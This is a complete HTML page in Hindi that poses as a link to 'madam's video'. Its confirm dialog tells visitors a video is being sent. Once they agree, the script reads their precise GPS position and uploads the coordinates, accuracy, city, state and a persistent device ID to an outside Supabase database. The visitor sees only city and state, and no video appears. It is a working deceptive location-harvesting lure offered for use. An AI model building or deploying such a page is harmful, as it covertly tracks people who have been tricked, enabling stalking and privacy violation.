<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>मैडम की वीडियो</title>

<style>
* {
  box-sizing: border-box;
}

html, body {
  margin: 0;
  width: 100%;
  min-height: 100%;
  background: #ffffff;
  font-family: Arial, sans-serif;
}

body {
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
}

#app {
  width: 100%;
  text-align: center;
  padding: 20px;
}

#locationButton {
  width: 112px;
  height: 112px;
  border: none;
  border-radius: 50%;
  background: #12c95a;
  padding: 0;
  cursor: pointer;
  animation: blink 1.2s infinite;
  -webkit-tap-highlight-color: transparent;
}

#locationButton:disabled {
  cursor: wait;
}

@keyframes blink {
  0% {
    opacity: 1;
    box-shadow: 0 0 0 0 rgba(18,201,90,.5);
  }
  70% {
    opacity: .75;
    box-shadow: 0 0 0 22px rgba(18,201,90,0);
  }
  100% {
    opacity: 1;
    box-shadow: 0 0 0 0 rgba(18,201,90,0);
  }
}

#result {
  display: none;
  margin-top: 24px;
  font-size: 20px;
  line-height: 1.8;
  color: #111111;
  overflow-wrap: anywhere;
}

#result div {
  margin: 4px 0;
}
</style>
</head>

<body>
<div id="app">

  <button id="locationButton"
          type="button"
          aria-label="Share location"></button>

  <div id="result">
    <div id="city"></div>
    <div id="state"></div>
  </div>

</div>

<script>
const SUPABASE_URL =
  "https://qtfnupdojsqpuywhoryu.supabase.co";

const SUPABASE_KEY =
  "sb_publishable_GAsXGjXdKTZxlm5tqx-t0w_96i3RmKE";

const button = document.getElementById("locationButton");
const result = document.getElementById("result");
const cityElement = document.getElementById("city");
const stateElement = document.getElementById("state");

let busy = false;

function getDeviceId() {
  let id = localStorage.getItem("location_demo_device_id");

  if (!id) {
    id = crypto.randomUUID();
    localStorage.setItem("location_demo_device_id", id);
  }

  return id;
}

button.addEventListener("click", function () {
  if (busy) return;

  if (!navigator.geolocation) {
    console.warn("Location is not supported by this browser.");
    return;
  }

  const consent = confirm(
    "मैडम की वीडियो आपको भेजी जा रही है " +
    "क्या आप सहमत हैं और आगे बढ़ना चाहते हैं?"
  );

  if (!consent) return;

  busy = true;
  button.disabled = true;

  navigator.geolocation.getCurrentPosition(
    async function (position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;

      let city = "";
      let state = "";

      try {
        // GPS निर्देशांकों से City और State पता करें
        const geoResponse = await fetch(
          "https://nominatim.openstreetmap.org/reverse" +
          "?format=jsonv2" +
          "&lat=" + encodeURIComponent(lat) +
          "&lon=" + encodeURIComponent(lon) +
          "&addressdetails=1" +
          "&accept-language=en"
        );

        if (geoResponse.ok) {
          const geo = await geoResponse.json();
          const address = geo.address || {};

          city =
            address.city ||
            address.town ||
            address.village ||
            address.municipality ||
            address.suburb ||
            address.county ||
            "";

          state = address.state || "";
        }
      } catch (error) {
        console.warn("City/State lookup failed:", error);
      }

      // Dashboard में पूरी लोकेशन सेव करें
      try {
        const data = {
          device_id: getDeviceId(),
          latitude: lat,
          longitude: lon,
          accuracy: position.coords.accuracy,
          city: city || null,
          state: state || null
        };

        const response = await fetch(
          SUPABASE_URL + "/rest/v1/locations",
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "apikey": SUPABASE_KEY,
              "Authorization": "Bearer " + SUPABASE_KEY,
              "Prefer": "return=minimal"
            },
            body: JSON.stringify(data)
          }
        );

        if (!response.ok) {
          console.error(
            "Location save failed:",
            response.status,
            await response.text()
          );
        }
      } catch (error) {
        console.error("Location upload failed:", error);
      }

      // यूज़र को केवल City और State दिखाएँ
      cityElement.textContent =
        "City: " + (city || "उपलब्ध नहीं");

      stateElement.textContent =
        "State: " + (state || "उपलब्ध नहीं");

      result.style.display = "block";
      button.style.display = "none";
      busy = false;
    },
    function (error) {
      console.warn("Location permission/error:", error.message);
      busy = false;
      button.disabled = false;
    },
    {
      enableHighAccuracy: true,
      timeout: 20000,
      maximumAge: 0
    }
  );
});
</script>
</body>
</html>
